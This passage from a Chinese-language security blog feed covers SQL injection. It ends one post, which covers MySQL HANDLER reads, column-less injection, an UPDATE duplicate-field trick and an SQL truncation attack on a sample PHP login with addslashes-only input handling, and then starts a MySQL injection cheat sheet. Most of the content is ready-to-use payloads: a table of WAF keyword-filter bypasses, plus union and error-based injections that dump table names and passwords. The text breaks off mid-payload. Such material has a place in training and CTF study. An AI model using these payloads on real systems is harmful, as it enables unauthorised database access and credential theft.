| NEXT &#125;<br>    <span class="hljs-comment">[ WHERE where_condition ]</span> <span class="hljs-comment">[LIMIT ... ]</span><br><br>HANDLER tbl_name CLOSE<br></code></pre></td></tr></table></figure><p>如：通过handler语句查询users表的内容</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><br>handler users <span class="hljs-built_in">open</span> <span class="hljs-keyword">as</span> yunensec; <span class="hljs-comment">#指定数据表进行载入并将返回句柄重命名</span><br>handler yunensec <span class="hljs-built_in">read</span> <span class="hljs-keyword">first</span>; <span class="hljs-comment">#读取指定表/句柄的首行数据</span><br>handler yunensec <span class="hljs-built_in">read</span> next; <span class="hljs-comment">#读取指定表/句柄的下一行数据</span><br>handler yunensec <span class="hljs-built_in">read</span> next; <span class="hljs-comment">#读取指定表/句柄的下一行数据</span><br>...<br>handler yunensec <span class="hljs-built_in">close</span>; <span class="hljs-comment">#关闭句柄</span><br></code></pre></td></tr></table></figure><h4 id="0x0b-无列名注入"><a href="#0x0b-无列名注入" class="headerlink" title="0x0b 无列名注入"></a>0x0b 无列名注入</h4><p>在不知道列名的情况下，除了使用order by盲注外，还可以直接使用select进行盲注，即select无列名注入。例如：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><br><span class="hljs-keyword">select</span> <span class="hljs-symbol">`1`</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users) <span class="hljs-keyword">as</span> a;<br></code></pre></td></tr></table></figure><p>具体可以参考<a href="https://github.com/su29029/su29029.github.io/blob/master/_posts/2020-6-23-V1lu0%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0hard_sql.md">V1lu0实验室招新hard_sql</a>或<a href="https://x5tar.com/2019/10/24/cnss-recruit-2019-web/#hard-sql">CNSS 2019招新hard_sql</a>。</p><h4 id="0x0c-其他"><a href="#0x0c-其他" class="headerlink" title="0x0c 其他"></a>0x0c 其他</h4><h5 id="UPDATE注入重复字段赋值"><a href="#UPDATE注入重复字段赋值" class="headerlink" title="UPDATE注入重复字段赋值"></a>UPDATE注入重复字段赋值</h5><p>即：<code>UPDATA table_name set field1=new_value,field1=new_value2 [where子句]</code>，最终field1字段的内容为new_value2，可用这个特性来进行UPDATA注入。如：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">UPDATE</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">set</span> field1=new_value,field1=(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()) [<span class="hljs-keyword">where</span>子句]<br></code></pre></td></tr></table></figure><h5 id="sql约束攻击"><a href="#sql约束攻击" class="headerlink" title="sql约束攻击"></a>sql约束攻击</h5><p>举个例子，假设我们创建了一个数据表：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users(<br>    username <span class="hljs-type">varchar</span>(<span class="hljs-number">25</span>),<br>    <span class="hljs-keyword">password</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">25</span>)<br>)<br></code></pre></td></tr></table></figure><p>这时候我们进行登录注册的相关代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">// 注册</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;127.0.0.1:3306&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;db&quot;</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . <span class="hljs-title function_ invoke__">mysqli_connect_error</span>());<br>&#125;<br><span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">addslashes</span>(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br><span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">addslashes</span>(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$sql1</span> = <span class="hljs-string">&quot;select * from users where username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$rs</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql1</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$rs</span>-&gt;<span class="hljs-title function_ invoke__">fetch_row</span>())&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;账号已注册&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$sql2</span> = <span class="hljs-string">&quot;insert into users values(&#x27;<span class="hljs-subst">$username</span>&#x27;,&#x27;<span class="hljs-subst">$password</span>&#x27;)&quot;</span>;<br>    <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql2</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;注册成功&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">// 登录</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;127.0.0.1:3306&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;db&quot;</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . <span class="hljs-title function_ invoke__">mysqli_connect_error</span>());<br>&#125;<br><span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">addslashes</span>(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br><span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">addslashes</span>(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where username = &#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;;&quot;</span>;<br><span class="hljs-variable">$rs</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$rs</span>-&gt;<span class="hljs-title function_ invoke__">fetch_row</span>())&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]=<span class="hljs-variable">$password</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里没有编码问题，也进行了转移操作，由于存在长度限制，故可尝试sql约束攻击。注册名为<code>admin                         1</code>的用户名，密码自定，随后使用admin登录，密码就是刚刚的密码，发现登录成功。(原理，注册时select的时候，超长度的字段不会截取，故检查出未注册，而insert的时候会截取前25个字符，故再进行登录的时候’admin’&#x3D;’admin                     ‘，从而登录成功)</p><h4 id="0x0c-常见过滤绕过方法"><a href="#0x0c-常见过滤绕过方法" class="headerlink" title="0x0c 常见过滤绕过方法"></a>0x0c 常见过滤绕过方法</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs sql">过滤关键字    <span class="hljs-keyword">and</span> <span class="hljs-keyword">or</span><br>php代码    preg_match(<span class="hljs-string">&#x27;/(and|or)/i&#x27;</span>,$id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">||</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br><br>过滤关键字    <span class="hljs-keyword">and</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">union</span><br>php代码    preg_match(<span class="hljs-string">&#x27;/(and|or|union)/i&#x27;</span>,$id)<br>会过滤的攻击代码    <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,password <span class="hljs-keyword">from</span> users<br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> userid<span class="hljs-operator">=</span><span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span><br><br>过滤关键字    <span class="hljs-keyword">and</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">where</span><br>php代码    preg_match(<span class="hljs-string">&#x27;/(and|or|union|where)/i&#x27;</span>,$id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br><br>过滤关键字    <span class="hljs-keyword">and</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">where</span><br>php代码    preg_match(<span class="hljs-string">&#x27;/(and|or|union|where)/i&#x27;</span>,$id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br><br>过滤关键字    <span class="hljs-keyword">and</span>, <span class="hljs-keyword">or</span>, <span class="hljs-keyword">union</span>, <span class="hljs-keyword">where</span>, limit<br>php代码    preg_match(<span class="hljs-string">&#x27;/(and|or|union|where|limit)/i&#x27;</span>, $id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> user_id <span class="hljs-keyword">having</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span>#user_id聚合中user_id为<span class="hljs-number">1</span>的<span class="hljs-keyword">user</span>为admin<br><br>过滤关键字    <span class="hljs-keyword">and</span>, <span class="hljs-keyword">or</span>, <span class="hljs-keyword">union</span>, <span class="hljs-keyword">where</span>, limit, <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span><br>php代码    preg_match(<span class="hljs-string">&#x27;/(and|or|union|where|limit|group by)/i&#x27;</span>, $id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> user_id <span class="hljs-keyword">having</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> substr(group_concat(user_id),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users ) <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br><br>过滤关键字    <span class="hljs-keyword">and</span>, <span class="hljs-keyword">or</span>, <span class="hljs-keyword">union</span>, <span class="hljs-keyword">where</span>, limit, <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>, <span class="hljs-keyword">select</span><br>php代码    preg_match(<span class="hljs-string">&#x27;/(and|or|union|where|limit|group by|select)/i&#x27;</span>, $id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> substr(gruop_concat(user_id),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users) <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;a&#x27;</span><br><br>过滤关键字    <span class="hljs-keyword">and</span>, <span class="hljs-keyword">or</span>, <span class="hljs-keyword">union</span>, <span class="hljs-keyword">where</span>, limit, <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>, <span class="hljs-keyword">select</span>, <span class="hljs-string">&#x27;</span><br><span class="hljs-string">php代码    preg_match(&#x27;</span><span class="hljs-operator">/</span>(<span class="hljs-keyword">and</span><span class="hljs-operator">|</span><span class="hljs-keyword">or</span><span class="hljs-operator">|</span><span class="hljs-keyword">union</span><span class="hljs-operator">|</span><span class="hljs-keyword">where</span><span class="hljs-operator">|</span>limit<span class="hljs-operator">|</span><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span><span class="hljs-operator">|</span><span class="hljs-keyword">select</span><span class="hljs-operator">|</span>\<span class="hljs-string">&#x27;)/i&#x27;</span>, $id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> substr(gruop_concat(user_id),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users) <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> user_id <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0x61</span> <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> unhex(<span class="hljs-number">61</span>)<br><br>过滤关键字    <span class="hljs-keyword">and</span>, <span class="hljs-keyword">or</span>, <span class="hljs-keyword">union</span>, <span class="hljs-keyword">where</span>, limit, <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>, <span class="hljs-keyword">select</span>, <span class="hljs-string">&#x27;, hex</span><br><span class="hljs-string">php代码    preg_match(&#x27;</span><span class="hljs-operator">/</span>(<span class="hljs-keyword">and</span><span class="hljs-operator">|</span><span class="hljs-keyword">or</span><span class="hljs-operator">|</span><span class="hljs-keyword">union</span><span class="hljs-operator">|</span><span class="hljs-keyword">where</span><span class="hljs-operator">|</span>limit<span class="hljs-operator">|</span><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span><span class="hljs-operator">|</span><span class="hljs-keyword">select</span><span class="hljs-operator">|</span>\<span class="hljs-string">&#x27;|hex)/i&#x27;</span>, $id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> unhex(<span class="hljs-number">61</span>)<br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-built_in">lower</span>(conv(<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">16</span>)) #十进制的<span class="hljs-number">11</span>转化为十六进制，并小写。<br><br>过滤关键字    <span class="hljs-keyword">and</span>, <span class="hljs-keyword">or</span>, <span class="hljs-keyword">union</span>, <span class="hljs-keyword">where</span>, limit, <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>, <span class="hljs-keyword">select</span>, <span class="hljs-string">&#x27;, hex, substr</span><br><span class="hljs-string">php代码    preg_match(&#x27;</span><span class="hljs-operator">/</span>(<span class="hljs-keyword">and</span><span class="hljs-operator">|</span><span class="hljs-keyword">or</span><span class="hljs-operator">|</span><span class="hljs-keyword">union</span><span class="hljs-operator">|</span><span class="hljs-keyword">where</span><span class="hljs-operator">|</span>limit<span class="hljs-operator">|</span><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span><span class="hljs-operator">|</span><span class="hljs-keyword">select</span><span class="hljs-operator">|</span>\<span class="hljs-string">&#x27;|hex|substr)/i&#x27;</span>, $id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-built_in">lower</span>(conv(<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">16</span>))<span class="hljs-operator">/</span>td<span class="hljs-operator">&gt;</span><br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> lpad(<span class="hljs-keyword">user</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>)<br><br>过滤关键字    <span class="hljs-keyword">and</span>, <span class="hljs-keyword">or</span>, <span class="hljs-keyword">union</span>, <span class="hljs-keyword">where</span>, limit, <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>, <span class="hljs-keyword">select</span>, <span class="hljs-string">&#x27;, hex, substr, 空格</span><br><span class="hljs-string">php代码    preg_match(&#x27;</span><span class="hljs-operator">/</span>(<span class="hljs-keyword">and</span><span class="hljs-operator">|</span><span class="hljs-keyword">or</span><span class="hljs-operator">|</span><span class="hljs-keyword">union</span><span class="hljs-operator">|</span><span class="hljs-keyword">where</span><span class="hljs-operator">|</span>limit<span class="hljs-operator">|</span><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span><span class="hljs-operator">|</span><span class="hljs-keyword">select</span><span class="hljs-operator">|</span>\<span class="hljs-string">&#x27;|hex|substr|\s)/i&#x27;</span>, $id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> lpad(<span class="hljs-keyword">user</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">/</span>td<span class="hljs-operator">&gt;</span><br>绕过方式    <span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>b<span class="hljs-operator">||</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>blpad(<span class="hljs-keyword">user</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>)<br><br>过滤关键字    <span class="hljs-keyword">and</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">where</span><br>php代码    preg_match(<span class="hljs-string">&#x27;/(and|or|union|where)/i&#x27;</span>,$id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">||</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">||</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure><p>节选自：<a href="http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a></p>]]></content>
    
    
    <categories>
      
      <category>sql</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>WAF绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql备忘录</title>
    <link href="/2022/06/16/sql%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <url>/2022/06/16/sql%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-Mysql-手工注入"><a href="#0x01-Mysql-手工注入" class="headerlink" title="0x01 Mysql 手工注入"></a>0x01 Mysql 手工注入</h2><h3 id="1-1-联合注入"><a href="#1-1-联合注入" class="headerlink" title="1.1 联合注入"></a>1.1 联合注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 4--+</span><br><span class="hljs-string">?id=0&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,database()<span class="hljs-comment">--+</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br><span class="hljs-string">?id=0&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>&quot;users&quot; <span class="hljs-comment">--+</span><br>#group_concat(column_name) 可替换为 unhex(Hex(<span class="hljs-built_in">cast</span>(column_name<span class="hljs-operator">+</span><span class="hljs-keyword">as</span><span class="hljs-operator">+</span><span class="hljs-type">char</span>)))column_name<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,3,group_concat(password) from users --+</span><br><span class="hljs-string">#group_concat 可替换为 concat_ws(&#x27;</span>,<span class="hljs-string">&#x27;,id,users,password )</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=0&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,password <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="1-2-报错注入"><a href="#1-2-报错注入" class="headerlink" title="1.2 报错注入"></a>1.2 报错注入</h3><h4 id="1-floor"><a href="#1-floor" class="headerlink" title="1.floor()"></a>1.floor()</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-keyword">user</span>(),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a);<br></code></pre></td></tr></table></figure><h4 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2.extractvalue()"></a>2.extractvalue()</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>)));<br></code></pre></td></tr></table></figure><h4 id="3-updatexml"><a href="#3-updatexml" class="headerlink" title="3.updatexml()"></a>3.updatexml()</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> 